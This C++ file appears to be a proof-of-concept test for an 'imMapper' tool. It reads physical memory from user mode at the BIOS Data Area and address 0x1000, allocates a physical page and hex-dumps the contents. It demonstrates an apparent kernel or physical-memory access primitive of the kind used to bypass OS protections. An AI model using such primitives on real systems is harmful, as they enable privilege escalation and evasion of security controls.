#include "../Source/imMapper.hpp"
#include "../Source/Helpers/Logger.hpp"
#include <cstdint>
#include <cstring>
#include <cstdio>

static constexpr uint64_t PHYS_BDA = 0x0000'0400;
static constexpr uint64_t PHYS_LOW_PAGE = 0x0000'1000;

static void DumpHex(const uint8_t* buf, size_t len, uint64_t base)
{
    for (size_t i = 0; i < len; i += 16) {
        char line[64]{};
        int off = 0;
        off += snprintf(line + off, sizeof(line) - off, "%016llX  ", (unsigned long long)(base + i));
        for (size_t j = 0; j < 16 && i + j < len; ++j)
            off += snprintf(line + off, sizeof(line) - off, "%02X ", buf[i + j]);
        Console->Log("%s", line);
    }
}

int main()
{
    imMapper mapper;
    if (!mapper.Initialize()) {
        Console->Log("[poc_read_kernel_mem] failed to initialize");
        return 1;
    }

    uint8_t buf[64]{};

    if (mapper.ReadMemory(PHYS_BDA, buf, sizeof(buf))) {
        Console->Log("[BDA @ 0x%X]", (unsigned)PHYS_BDA);
        DumpHex(buf, sizeof(buf), PHYS_BDA);
    } else {
        Console->Log("[BDA] read FAILED");
    }

    memset(buf, 0, sizeof(buf));
    if (mapper.ReadMemory(PHYS_LOW_PAGE, buf, sizeof(buf))) {
        Console->Log("[0x1000]");
        DumpHex(buf, sizeof(buf), PHYS_LOW_PAGE);
    } else {
        Console->Log("[0x1000] read FAILED");
    }

    Comms::PhysAlloc alloc{};
    if (mapper.AllocPhysMem(1, alloc)) {
        Console->Log("[AllocPhysMem] physAddr=0x%016llX userVa=0x%016llX",
            (unsigned long long)alloc.physicalAddress, (unsigned long long)alloc.userVa);
        memset(buf, 0, sizeof(buf));
        if (mapper.ReadMemory(alloc.physicalAddress, buf, sizeof(buf))) {
            Console->Log("[AllocPhysMem read]");
            DumpHex(buf, sizeof(buf), alloc.physicalAddress);
        } else {
            Console->Log("[AllocPhysMem] read FAILED");
        }
    } else {
        Console->Log("[AllocPhysMem] FAILED");
    }

    return 0;
}
